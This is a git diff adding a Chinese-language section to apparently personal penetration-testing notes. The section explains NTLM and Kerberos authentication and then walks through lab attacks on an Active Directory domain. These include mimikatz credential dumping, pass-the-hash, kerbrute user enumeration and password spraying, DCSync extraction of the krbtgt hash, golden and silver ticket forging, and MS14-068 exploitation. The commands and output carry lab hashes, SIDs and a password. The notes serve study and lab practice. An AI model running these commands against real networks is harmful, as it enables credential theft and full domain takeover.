@@ -642,3 +642,598 @@ C:\Users\yutaowin10>nltest /dsgetdc:ghost /server:192.168.188.100
 | 11211       | memcacache             | 未授权访问                                                   |
 | 27017       | mongodb                | 爆破\未授权访问                                              |
 
+# 6.Windows认证协议
+
+Windows主要使用NTLM和kerberos认证
+
+## 1.NTLM认证
+
+>   [NTLM认证](https://zhuanlan.zhihu.com/p/79196603)
+
+NTLM是NT LAN Manager的缩写，NTLM是基于挑战/应答的身份验证协议，是 Windows NT 早期版本中的标准安全协议。
+
+Windows 中是不保存明文密码的，只会保存密码的哈希值。 其中本机用户的密码哈希是放在 本地的 SAM 文件 里面，域内用户的密码哈希是存在域控的 NTDS.dit 文件 里面.
+
+eg：`Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::`
+
+其中`AAD3B435B51404EEAAD3B435B51404EE`是LM Hash，`31D6CFE0D16AE931B73C59D7E0C089C0`是NTLM Hash。
+
+NTLM 协议的认证过程有三步：
+
+-   **协商**：主要用于确认双方协议版本（NTLMv1、NTLMv2等）
+-   **质询**：质询/应答 （*Challenge/Response*）模式，用于消息交换
+-   **验证**：验证身份合法性，通常由 Server端或 DC完成这个过程
+
+### LM hash
+
+计算方法：
+
+1.密码转为大写，转换为16进制字符串，不足14字节将会用0来再后面补全。
+
+2.密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度
+
+3.再分7bit为一组,每组末尾加0，再组成一组
+
+4.上步骤得到的二组，分别作为key 为 "KGS!@#$%"进行DES加密。
+
+5.将加密后的两组拼接在一起，得到最终LM HASH值。
+
+### NTLM hash
+
+从Windows Vista 和 Windows Server 2008开始，默认情况下只存储 NTLM Hash，LM Hash 将不再存在。。
+
+如果空密码或者不储蓄 LM Hash 的话，我们抓到的LM Hash是`AAD3B435B51404EEAAD3B435B51404EE`。所以在 Windows 7 中我们看到抓到 LM Hash 都是`AAD3B435B51404EEAAD3B435B51404EE`，这里的 LM Hash 已经没有任何价值了。
+
+NTLM hash计算方法：
+
+-   1.先将用户密码转换为十六进制格式。
+-   2.将十六进制格式的密码进行Unicode编码。
+-   3.使用MD4摘要算法对Unicode编码数据进行Hash计算
+
+
+
+NTLM认证分为本地认证和网络认证。
+
+有三个版本， NTLMv1 、NTLMv2 、NTLMsession v2 三个版本，目前使用最多的是NTLMv2版本。
+
+#### 本地认证
+
+Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (*Security Account Manager Database*，安全账号管理数据库)中。
+
+>   SAM文件的路径是 `%SystemRoot%\system32\config\sam`
+
+当用户输入密码进行本地认证的过程中，用户输入的密码将为被转化为 NTLM Hash，然后与SAM中的NTLM Hash进行比较。当用户注销、重启、锁屏后，操作系统会让 **winlogon.exe** 显示登录界面（输入框）。当 winlogon.exe 接收输入后，会将密码交给lsass进程。**lsass.exe** 是一个系统进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略，这个进程中会存一份明文密码，将明文密码加密成 NTLM Hash，对SAM数据库比较认证。
+
+>   winlogon.exe -> 接收用户输入 -> lsass.exe -> (认证)
+
+Net-NTLM Hash v1的格式为：
+
+```
+username::hostname:LM response:NTLM response:challenge
+```
+
+Net-NTLM Hash v2的格式为：
+
+```
+username::domain:challenge:HMAC-MD5:blob
+```
+
+客户端发送用户名等身份信息，服务端生成随机16位challenge发给客户端，客户端使用NTLM hash加密challenge发给服务端。服务端通过用户名找到NTLM hash然后加密challenge跟客户端发送过来的比对，比对成功则认证成功。
+
+
+
+#### 网络认证
+
+这种情况适用于使用域账号登录的场景，这个时候服务端是没有用户的hash的。所以不一样的地方是服务端会将用户信息、challenge、客户端返回的信息都发给域控，由域控做认证再返回结果。流程图见下图
+
+![1619093645_6081688d6fe4ca32a240d.png!small?1619093647476](README/1619093645_6081688d6fe4ca32a240d.png!small)
+
+## 2.kerberos认证
+
+Kerberos认证的是由三方来完成的，他们分别是client、server、KDC(Key Distribution Center密钥分发中心)
+
+KDC 服务默认会安装在一个域的域控中，而 Client 和 Server 为域内的用户或者是服务，如 HTTP 服务，SQL 服务。在 Kerberos 中 Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来决定。
+
+其中KDC是由两种服务所构成的：
+
+-   AS(Authentication Service)：验证 Client 端的身份，验证通过就会给一张 TGT（Ticket Granting Ticket）票给 Client。
+
+-   TGS(Ticket Granting Service)：通过 AS 发送给 Client 的票（TGT）换取访问 Server 端的票ST（ServiceTicket）也有资料称为 TGS Ticket，为了和 TGS 区分，在这里就用 ST 来说明。
+
+AS是用来为client生成TGT(Ticket Granting Ticket)的，TGS是用来为client生成某个服务的ST的，TGT是用来获取ST的临时凭证，ST是用来访问某种服务所必须使用的票据。
+
+KDC 服务框架中包含一个krbtgt账户，它是在创建域时系统自动创建的一个账号，你可以暂时理解为他就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。
+
+### 认证流程
+
+![1619093657_60816899201be08a4b1ab.png!small?1619093659321](README/1619093657_60816899201be08a4b1ab.png!small)
+
+当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块：
+
+**The Authentication Service Exchange**：Client 与 AS 的交互；
+
+**The Ticket-Granting Service (TGS) Exchange**：Client 与 TGS 的交互；
+
+**The Client/Server Authentication Exchange**：Client 与 Server 的交互。
+
+1.  client与AS：
+
+    client发送： 用户名 + 用户密码加密（用户信息，时间戳等）
+
+    AS：根据用户名找到用户密码，解密出用户信息和事件戳，核实成功后认证成功，然后随机生成一个session key
+    
+    AS发送：用户密码加密（session key） + TGT(也就是krbtgt加密（用户信息，session key）)
+
+    注意：TGT中用户唯一不知道的是krbtgt的密码hash，所以有了这个hash，就可以自己伪造TGT，也就是所谓的**金票据**。
+
+2.  client与TGS交互
+
+    client发送：session key加密（用户信息，时间戳等） + 需要访问的服务名 + TGT
+    
+    TGS：使用krbtgt密码解密TGT，获得session key 解密出用户信息，与TGS中的用户信息比对。认证成功后生成随机的 server session key
+    
+    TGS发送：session key加密（server session key） + ST(也就是对应服务端密码加密（用户信息，server session key）)
+
+    注意：ST中用户唯一不知道的是server的密码hash，所以有了这个hash，就可以自己伪造ST，也就是所谓的**银票据**。
+
+3.  client与server交互
+
+    client发送：server session key加密（用户信息，时间戳等） + ST
+    
+    server：使用自己的密码解密ST，获得server session key，然后将server session key解密后获得的用户信息和ST中的用户信息比对，认证成功。
+
+## 3.PAC(特权属性证书)
+
+在 Kerberos 最初设计的几个流程里说明了如何证明 Client 是 Client 而不是由其他人来冒充的，但并没有声明 Client 有没有访问 Server 服务的权限，因为在域中不同权限的用户能够访问的资源是有区别的。
+所以微软为了解决这个问题在实现 Kerberos 时加入了 PAC 的概念，PAC 的全称是 Privilege Attribute Certificate(特权属性证书)。可以理解为火车有一等座，也有二等座，而 PAC 就是为了区别不同权限的一种方式。
+
+## 4.Kerberos相关攻击技巧
+
+[Kerberos相关攻击技巧](https://xz.aliyun.com/t/8690)
+
+### Hash传递攻击（PTH）
+
+[Hash传递攻击](https://cloud.tencent.com/developer/article/1829649)
+
+[内网渗透之命令行渗透 - 渗透红队笔记](https://cloud.tencent.com/developer/article/1752168)
+
+#### 简介
+
+PTH攻击是指攻击者可以通过捕获密码的hash值（无需解密），简单地将其传递来进行身份验证，以此来横向访问其他网络系统。
+
+攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。
+
+工具：
+
+>   [Github](https://github.com/maaaaz/impacket-examples-windows)
+>
+>   [mimikatz](https://github.com/gentilkiwi/mimikatz)
+
+#### 使用mimikatz
+
+使用mimikatz抓取密码或者hash，其实如果在域内主机可以获取到明文密码，我们可以使用明文密码进行登录，但是在很多情况下，由于域内密码复杂度要求，我们可能无法获取到域内主机明文密码，这就导致我们必须使用hash传递来获取域控权限。
+
+需要本地管理员权限
+
+```sh
+privilege::debug  # 查看是否有debug权限
+token::elevate    # 提升到最高权限
+sekurlsa::logonpasswords full  #抓取所有的密码,如果密码复杂则只会抓到hash
+```
+
+![image-20220318183012610](README/image-20220318183012610.png)
+
+查看域控文件目录：
+
+```sh
+mimikatz # sekurlsa::pth /user:administrator /domain:ghost /ntlm:520126a03f5d5a8d836f1c4f34ede7ce
+user    : administrator
+domain  : ghost
+program : cmd.exe
+impers. : no
+NTLM    : 520126a03f5d5a8d836f1c4f34ede7ce
+  |  PID  6968
+  |  TID  4008
+  |  LSA Process is now R/W
+  |  LUID 0 ; 22668132 (00000000:0159e364)
+  \_ msv1_0   - data copy @ 000001F6C8FFE6F0 : OK !
+  \_ kerberos - data copy @ 000001F6C8E5ED28
+   \_ des_cbc_md4       -> null
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ *Password replace @ 000001F6C8465DC8 (32) -> null
+```
+
+会弹出来个cmd，这个cmd是域内主机的cmd，不是域控的cmd。
+
+可以直接连接该主机、查看目录文件等操作
+
+```
+连接域控：net use \\192.168.188.100
+查看文件目录：dir \\192.168.188.100\c$
+```
+
+查看目标开放的共享
+
+```
+C:\Users>net view \\192.168.188.100
+在 \\192.168.188.100 的共享资源
+共享名    类型  使用为  注释
+
+-------------------------------------------------------------------------------
+NETLOGON  Disk          Logon server share
+SYSVOL    Disk          Logon server share
+命令成功完成。
+```
+
+只有域控才会有下面两个共享目录：
+
+```javascript
+NETLOGON      Disk          Logon server share
+SYSVOL        Disk          Logon server share
+```
+
+删除链接
+
+```javascript
+net use \\192.168.188.100 /del /y
+
+C:\Users>net use \\192.168.188.100 /del /y
+\\192.168.188.100 已经删除。
+
+
+```
+
+copy 命令
+
+```
+#把当前机器C盘下的1.txt文件拷贝到目标桌面
+copy 1.txt \\192.168.188.100\c$\users\administrator\desktop\
+```
+
+![image-20220318185354157](README/image-20220318185354157.png)
+
+
+
+```
+# 吧目标机器上的pass.txt拷贝到本地
+coyp \\192.168.188.100\c$\users\administrator\desktop\pass.txt
+```
+
+查看内容
+
+```
+# 查看目标桌面1.txt文件内容
+type \\192.168.188.100\c$\users\administrator\desktop\1.txt
+```
+
+![image-20220318185531211](README/image-20220318185531211.png)
+
+除此之外还有psexec，wmiexec，rpcdump等等，（之后再写）
+
+[PTH(Pass The Hash)哈希传递攻击手法与防范](https://cloud.tencent.com/developer/article/1829649)
+
+### 域外用户枚举
+
+在域外也能和域进行交互的原因，是利用了kerberos协议认证中的AS-REQ阶段。只要我们能够访问域控88(kerberos服务)端口，就可以通过这种方式去枚举用户名并且进行kerberos协议的暴力破解了！
+
+Kerbrute使用的是kerberos pre-auth协议，不会产生大量的日志 (4625 - An account failed to log on)，但是会产生以下日志：
+
+-   口令验证成功时产生日志 (4768 - A Kerberos authentication ticket (TGT) was requested)
+-   口令验证失败时产生日志 (4771 - Kerberos pre-authentication failed)
+
+#### 攻击方法
+
+##### kerbrute_windows_amd64.exe
+
+>   [kerbrute_windows_amd64.exe](https://github.com/ropnop/kerbrute/releases)
+
+在这里我们需要获取dc的ip，域名。将想要爆破的用户放入user.txt表中，这样就可以获取到了！
+
+```
+kerbrute_windows_amd64.exe userenum --dc 192.168.188.100 -d ghost.com user.txt
+```
+
+![image-20220318191443842](README/image-20220318191443842.png)
+
+之后爆破
+
+```
+kerbrute_windows_amd64.exe passwordspray -d 192.168.188.100 -d ghost.com Admin123!
+```
+
+![image-20220318191719021](README/image-20220318191719021.png)
+
+#### PY版本 pyKerbrute
+
+>   [pyKerbrute](https://github.com/3gstudent/pyKerbrute)
+
+不演示了，爆破用户：
+
+```
+python2 EnumADUser.py 192.168.188.100 ghost.com user.txt tcp
+python2 EnumADUser.py 192.168.188.100 ghost.com user.txt udp
+```
+
+口令爆破：
+
+```
+#明文
+python2 ADPwdSpray.py 192.168.188.100 ghost.com user.txt clearpassword Admin123! tcp
+
+#hash
+python2 ADPwdSpray.py 192.168.188.100 ghost.com user.txt ntlmhash aaaaaaaaaaaaaaaaaaaa(hash) udp
+```
+
+
+
+参考：
+
+>   ```
+>   https://mp.weixin.qq.com/s/-V1gEpdsUExwU5Fza2YzrA
+>   https://mp.weixin.qq.com/s/vYeR9FDRUfN2ZczmF68vZQ
+>   https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&mid=2247496592&idx=2&sn=3805d213ba1013e320f48169516c2ca3&chksm=e91523aade62aabc21ebca36a5216f63ec0d4c61e3dd1b4632c10adbb85dfde07e6897897fa5&scene=21#wechat_redirect
+>   https://blog.csdn.net/weixin_41598660/article/details/109152077
+>   https://xz.aliyun.com/t/7724#toc-4
+>   https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+>   http://hackergu.com/ad-information-search-powerview/
+>   https://www.freebuf.com/news/173366.html
+>   https://www.cnblogs.com/mrhonest/p/13372203.html
+>   https://payloads.online/scripts/Invoke-DomainPasswordSpray.txt
+>   https://github.com/dafthack/DomainPasswordSpray
+>   https://blog.csdn.net/qq_36119192/article/details/105088239
+>   https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
+>   ```
+
+### 密码喷洒攻击(Password Spraying)
+
+### KB22871997补丁与PTH攻击
+
+### Pass the Hash with Remote Desktop
+
+### 黄金票据
+
+Golden Ticket（下面称为金票）是通过伪造的TGT（Ticket Granting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。
+
+条件：
+
+1、域名称 
+
+2、域的 SID 值 
+
+3、域的 KRBTGT 账号的 HASH 
+
+4、伪造任意用户名
+
+得到kratgr的hash：
+
+```sh
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::dcsync /domain:ghost.com /all /csv
+[DC] 'ghost.com' will be the domain
+[DC] 'WIN-4JS3YOGGQ2T.ghost.com' will be the DC server
+[DC] Exporting domain 'ghost.com'
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+1001    WIN-4JS3YOGGQ2T$        b443a0863dfb6f394b46983d0d795fb6        532480
+1104    DM_WIN2003$     13e19dba1a1ad144d9bced3585afa9a9        4096
+500     Administrator   520126a03f5d5a8d836f1c4f34ede7ce        512
+1000    DC      520126a03f5d5a8d836f1c4f34ede7ce        544
+502     krbtgt  a5269d41b184a97adc9b991f2ee21f12        514
+1105    DM_WINXP$       5469d97f136d8662f65377f3ea8e4835        528384
+1107    yutao   520126a03f5d5a8d836f1c4f34ede7ce        66048
+1109    yutaowin10      520126a03f5d5a8d836f1c4f34ede7ce        66048
+1108    DM_WIN10$       bc3746c7020c2c97eac589107a57790f        4096
+1110    DM_WIN10_2$     aa5910b813ef7a8784d7522dad99ee07        4096
+mimikatz # lsadump::dcsync /domain:ghost.com /user:krbtgt
+[DC] 'ghost.com' will be the domain
+[DC] 'WIN-4JS3YOGGQ2T.ghost.com' will be the DC server
+[DC] 'krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 2022/3/16 18:25:33
+Object Security ID   : S-1-5-21-1238213221-2393825874-2881136966-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: a5269d41b184a97adc9b991f2ee21f12
+    ntlm- 0: a5269d41b184a97adc9b991f2ee21f12
+    lm  - 0: dadc5e38f4551dd9bd6f8673528f3d6a
+
+Supplemental Credentials:
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : GHOST.COMkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : da6374753cb6f5e191265a283115ced1fe1d2c5e5091d60093903cb90ef67fb7
+      aes128_hmac       (4096) : 777c080c663f51196b554d5348ee8123
+      des_cbc_md5       (4096) : 5e83f83776ae8a1a
+      des_cbc_crc       (4096) : 5e83f83776ae8a1a
+      rc4_plain         (4096) : a5269d41b184a97adc9b991f2ee21f12
+
+* Primary:Kerberos *
+    Default Salt : GHOST.COMkrbtgt
+    Credentials
+      des_cbc_md5       : 5e83f83776ae8a1a
+      des_cbc_crc       : 5e83f83776ae8a1a
+      rc4_plain         : a5269d41b184a97adc9b991f2ee21f12
+
+* Packages *
+    Kerberos-Newer-Keys
+
+* Primary:WDigest *
+    01  b56b310c7d4d84d51763197cc777e236
+    02  f11fc690746ff0c5017fbb804a5afadb
+    03  1284d4bd47f80c75715883ecae93aee3
+    04  b56b310c7d4d84d51763197cc777e236
+    05  f11fc690746ff0c5017fbb804a5afadb
+    06  f0858287a155ee5ea15271dca0c480c3
+    07  b56b310c7d4d84d51763197cc777e236
+    08  bc8cf0c0bb41ee11fd93ce726577cd2e
+    09  bc8cf0c0bb41ee11fd93ce726577cd2e
+    10  053d15785d6b8e58659321a0c0bbe730
+    11  910f26088b80677ff20523ae2f570ad2
+    12  bc8cf0c0bb41ee11fd93ce726577cd2e
+    13  37dca035e5d9ce4b7539b40dd4a3b711
+    14  910f26088b80677ff20523ae2f570ad2
+    15  c01bc6cc7073767ae9332d6948012efb
+    16  c01bc6cc7073767ae9332d6948012efb
+    17  5bef1b58b30a684217b555a9c694b018
+    18  c7ddf9a29f31081a0c2c59f0ba887591
+    19  6ed3c0509d5ed0b11be6d3cb7d9eec89
+    20  2230919d6c19fdc4794a4d4cbf08cbcc
+    21  f5e434234d81d0ba2362f17a8b4a61a0
+    22  f5e434234d81d0ba2362f17a8b4a61a0
+    23  4cf7197a9331618814144057e85b32b6
+    24  ada6252d89f49e2cc822fb2545c8a4ac
+    25  ada6252d89f49e2cc822fb2545c8a4ac
+    26  55c19bbc0da0e9ae00a609c755da8ef5
+    27  9df3396f69d865ef7b7fabdd30e5c225
+    28  b8685ccf3967652956f90dd8c912dd9f
+    29  534307dab20bfd1901a972ed1196c351
+
+```
+
+利用 mimikatz 生成金票生成.kirbi 文件并保存：
+
+```
+mimikatz.exe "kerberos::golden /admin:new_user_gold /domain:ghost.com /sid:S-1-5-21-1238213221-2393825874-2881136966-502 /krbtgt:a5269d41b184a97adc9b991f2ee21f12 /ticket:ticket.kirbi" exit
+
+/admin：伪造的用户名
+/domain：域名称
+/sid：SID 值，注意是去掉最后一个-后面的值
+/krbtgt：krbtgt 的 HASH 值
+/ticket：生成的票据名称 
+```
+
+![image-20220318200338986](README/image-20220318200338986.png)
+
+登录域内普通用户，通过 mimikatz 中的 kerberos::ptt 功能将ticket.kirbi 导入内存中。
+
+导入票据之前访问域控:
+
+![image-20220318200449833](README/image-20220318200449833.png)
+
+导入：
+
+```
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+
+mimikatz # kerberos::ptt C:\Users\yutaowin10\Desktop\Tool\mimikatz\ticket.kirbi
+
+* File: 'C:\Users\yutaowin10\Desktop\Tool\mimikatz\ticket.kir
+```
+
+再次访问域控即可成功。
+
+
+
+### 白银票据
+
+Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。
+
+1.不需要与 KDC 进行交互 
+
+2.需要 server 的 NTLM hash
+
+mimikatz：
+
+```
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+![image-20220318202007613](README/image-20220318202007613.png)
+
+```
+kerberos::golden /domain:ghost.com /sid:S-1-5-21-1238213221-2393825874-2881136966-500 /target:WIN-4JS3YOGGQ2T.ghost.com /service:cifs /rc4:520126a03f5d5a8d836f1c4f34ede7ce /user:new_user_gold /ptt
+
+/domain
+/sid
+/target:目标服务器的域名全称，此处为域控的全称
+/service:目标服务器上面的kerberos服务，此处为cifs
+/rc4:计算机账户的NTLM hash，域控主机的计算机账户
+/user:要伪造的用户名
+```
+
+此时可以成功访问域控上的文件共享
+
+### 关于黄金票据和白银票据的一些区别:
+
+#### 1.访问权限不同
+
+-   Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限
+-   Silver Ticket: 伪造TGS,只能访问指定的服务
+
+#### 2.加密方式不同
+
+-   Golden Ticket 由Kerberos的Hash—> krbtgt加密
+-   Silver Ticket 由服务器端密码的Hash值—> master key 加密
+
+#### 3.认证流程不同
+
+-   Golden Ticket 的利用过程需要访问域控(KDC)
+-   Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器
+
+
+
+### AS-REP Roasting攻击
+
+### SPN 扫描
+
+### Kerberosast攻击
+
+### MS14-068
+
+能够将任意一台域机器提升成域控相关权限
+
+利用条件：
+
+-   小于2012R2的域控没有打KB3011780，高版本默认集成
+-   无论工作组、域，高低权限都可以使用生成的票据进行攻击
+-   域账户使用时需要klist purge清除票据
+
+环境：
+
+>   域控：2008，192.168.188.100，主机名：WIN-4JS3YOGGQ2T
+>
+>   域成员：192.168.188.104 ，yutaowin10 ，Admin123！
+
+获取域用户的sid：
+
+![image-20220318194110678](README/image-20220318194110678.png)
+
+直接生成票据：
+
+```
+MS14-068.exe -u yutaowin10@ghost.com -s S-1-5-21-1238213221-2393825874-2881136966-1109 -d 192.168.188.100 -p Admin123!
+```
+
+使用生成的票据：
+
+```
+kerberos::ptc TGT_yutaowin10@ghost.com.ccache
+```
+
+通过域控的主机名访问：
+
+```
+dir \\WIN-4JS3YOGGQ2T\c$
+```
+
